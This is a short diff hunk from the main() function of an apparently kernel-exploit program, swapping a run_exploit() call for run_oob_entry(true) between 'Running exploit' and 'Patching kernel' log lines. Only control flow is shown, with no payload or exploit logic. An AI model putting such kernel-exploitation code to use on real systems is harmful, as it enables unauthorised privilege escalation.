@@ -26,7 +26,7 @@ int main(int argc, char * argv[]) {
     }
 
     print_log("[*] Running exploit...\n");
-    if (run_exploit() != 0) return -1;
+    if (run_oob_entry(true) != 0) return -1;
 
     print_log("[*] Patching kernel...\n");
     if (patch_kernel() != 0) return -1;
